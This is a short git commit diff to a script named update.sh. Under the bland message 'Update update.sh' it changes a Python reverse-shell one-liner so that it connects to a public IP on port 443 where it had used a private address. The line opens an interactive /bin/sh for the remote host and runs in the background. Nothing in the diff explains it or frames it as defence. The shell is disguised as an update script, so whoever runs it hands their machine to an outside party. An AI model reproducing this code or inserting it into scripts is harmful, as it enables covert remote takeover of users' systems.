c7776e33520b686bee14af9b88e4f90c455c7b96
zeotaps <86513954+zeotaps@users.noreply.github.com>
2021-10-04 12:03:04 +0530

    Update update.sh

--- update.sh
+++ update.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.29.15",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' &
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("34.134.51.100",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' &
